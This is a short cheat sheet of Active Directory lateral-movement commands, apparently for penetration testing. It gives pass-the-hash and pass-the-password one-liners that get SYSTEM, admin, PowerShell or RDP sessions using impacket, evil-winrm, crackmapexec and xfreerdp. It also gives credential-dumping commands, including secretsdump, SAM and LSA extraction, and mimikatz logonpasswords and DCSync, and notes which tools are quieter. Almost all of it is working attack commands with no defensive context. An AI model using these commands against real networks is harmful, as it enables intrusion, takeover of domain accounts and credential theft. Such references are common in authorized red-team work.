# AD Lateral Movement

## Pass the Hash

```bash
impacket-psexec domain/admin@TARGET -hashes LM:NTLM         # SYSTEM shell
impacket-wmiexec domain/admin@TARGET -hashes LM:NTLM        # admin shell
impacket-smbexec domain/admin@TARGET -hashes LM:NTLM        # SYSTEM shell
evil-winrm -i TARGET -u admin -H NTLM_HASH                  # PowerShell
crackmapexec smb TARGET -u admin -H NTLM_HASH -x "whoami"   # single cmd
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH /cert-ignore     # RDP
```

## Pass the Password

```bash
impacket-psexec domain/admin:password@TARGET
evil-winrm -i TARGET -u admin -p 'password'
crackmapexec smb RANGE -u admin -p 'password' --continue-on-success
```

## Credential Dumping (from compromised machines)

```bash
# Remote
impacket-secretsdump domain/admin:pass@TARGET
crackmapexec smb TARGET -u admin -p pass --sam               # local hashes
crackmapexec smb TARGET -u admin -p pass --lsa               # LSA secrets

# Local (mimikatz on the machine)
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords                           # cached creds
mimikatz# lsadump::sam                                       # local SAM
mimikatz# lsadump::dcsync /domain:domain.com /user:admin     # DCSync
```

## Tool Choice

```
psexec:    Creates a service → runs as SYSTEM. Noisy, leaves artifacts.
wmiexec:   Uses WMI → runs as the user. Quieter than psexec.
smbexec:   Uses SMB → runs as SYSTEM. Alternative to psexec.
evil-winrm: Uses WinRM (5985) → PowerShell session. Best for interactive work.
RDP:        Full GUI access. Use when you need to interact with applications.
```
